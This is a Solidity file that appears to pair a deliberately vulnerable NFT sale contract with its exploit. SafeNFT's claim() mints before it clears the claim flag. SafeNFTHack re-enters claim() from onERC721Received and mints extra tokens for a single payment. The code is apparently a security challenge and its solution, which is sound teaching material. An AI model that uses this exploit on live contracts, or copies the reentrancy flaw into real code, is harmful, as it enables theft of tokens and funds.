// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.7;

import "openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";
import "openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract SafeNFT is ERC721Enumerable {
    uint256 price;
    mapping(address=>bool) public canClaim;

    constructor(string memory tokenName, string memory tokenSymbol,uint256 _price) ERC721(tokenName, tokenSymbol) {
        price = _price; //price = 0.01 ETH
    }

    function buyNFT() external payable {
        require(price==msg.value,"INVALID_VALUE");
        canClaim[msg.sender] = true;
    }

    function claim() external {
        require(canClaim[msg.sender],"CANT_MINT");
        _safeMint(msg.sender, totalSupply()); 
        canClaim[msg.sender] = false;
    }
}

contract SafeNFTHack {
    SafeNFT private immutable _safeNFT;

    bool private _reenter = true;

    constructor(SafeNFT safeNFT) {
        _safeNFT = safeNFT;
    }

    function buyNFT() external payable {
        _safeNFT.buyNFT{value: msg.value}();
    }

    function hack() external {
        _safeNFT.claim();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        if (_reenter) {
            _reenter = false;
            _safeNFT.claim();
        }
        
        return IERC721Receiver.onERC721Received.selector;
    }
}